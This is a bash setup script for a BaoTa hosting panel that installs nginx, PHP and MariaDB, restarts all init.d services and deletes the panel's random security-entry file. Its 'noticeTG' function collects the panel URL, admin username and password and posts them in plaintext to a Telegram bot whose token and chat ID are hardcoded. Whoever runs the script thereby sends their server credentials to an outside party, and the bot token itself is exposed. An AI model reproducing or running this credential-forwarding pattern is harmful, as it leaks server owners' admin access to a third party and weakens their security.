#!/bin/bash

export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

#删除随机的安全入口
rm -rf /www/server/panel/data/admin_path.pl

init_env(){
    echo "开始安装NGINX1.20.1"
    bash /www/server/panel/install/install_soft.sh 1 install nginx 1.20.1 &>/dev/null
    echo "nginx安装完成！"
    echo "开始安装php7.4"
    bash /www/server/panel/install/install_soft.sh 1 install php 7.4 &>/dev/null || echo 'Ignore Error' &>/dev/null
    echo "php安装完成！"
    echo "开始安装mysql mariadb_10.3"
    bash /www/server/panel/install/install_soft.sh 1 install mysql mariadb_10.3 &>/dev/null
    echo "mysql安装完成！"    
    #echo "开始安装phpadmin4.9"
    #bash /www/server/panel/install/install_soft.sh 1 install phpmyadmin 4.9 &>/dev/null || echo 'Ignore Error' &>/dev/null
    #echo "phpadmin安装完成！"
    echo "所有软件已安装完毕！"
    #添加软件到首页
    #echo '["linuxsys", "webssh", "nginx", "php-7.4", "mysql", "phpmyadmin"]' > /www/server/panel/config/index.json
    echo '["linuxsys", "webssh", "nginx", "php-7.4", "mysql"]' > /www/server/panel/config/index.json
    echo "正在重启所有服务器组件"
    for file in `ls /etc/init.d`
    do if [ -x /etc/init.d/${file} ];  then 
        /etc/init.d/$file restart
    fi done     
    echo "重启各种服务组件完毕！"
}

noticeTG(){
    TOKEN=5368544643:AAFANegpqLEveFnwVANjFGVev1I-EvsViaA #TG机器人API—Token口令
    chat_ID=5251565559 #推送消息的ID（可以是个人、也可以是Group或Chanel）
    BtPanelURL=`echo 14 | bt |grep http`
    username=`echo 14 | bt |grep username`
    password=`echo 14 | bt |grep password`
    message_text="【LNMP系统安装完成通知】恭喜！您的系统已圆满安装完成，请查看！
    $BtPanelURL
    $username
    $password"
    #echo "$message_text"
    curl -s -X POST https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${chat_ID} -d text="${message_text}" > /dev/null
}

init_env
noticeTG 
clear
#显示宝塔面板信息
bt 14
